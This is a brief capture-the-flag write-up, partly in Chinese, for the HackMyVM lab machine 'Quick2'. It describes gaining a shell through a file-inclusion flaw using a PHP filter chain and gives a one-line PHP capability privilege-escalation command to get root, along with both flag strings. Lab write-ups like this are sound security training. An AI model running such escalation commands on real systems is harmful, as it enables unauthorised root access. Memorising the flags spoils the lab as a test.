# Quick2

2025.03.28 https://hackmyvm.eu/machines/machine.php?vm=Quick2

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

http://192.168.5.40/file.php 有 LFI 读取 passwd 发现用户 nick 和 andrew ，利用 php filter chain 拿到 shell。

得到数据库配置信息：

```
$servername = "localhost";
$username = "username";
$password = "password";
$dbname = "dbname";
```

user flag:

```
www-data@quick2:/home/nick$ cat user.txt
HMV{Its-gonna-be-a-fast-ride}
```

getcap 发现 /usr/bin/php8.1 cap_setuid=ep

```
/usr/bin/php8.1 -r "posix_setuid(0); system('/bin/bash');"

HMV{This-was-a-Quick-AND-fast-machine}
```
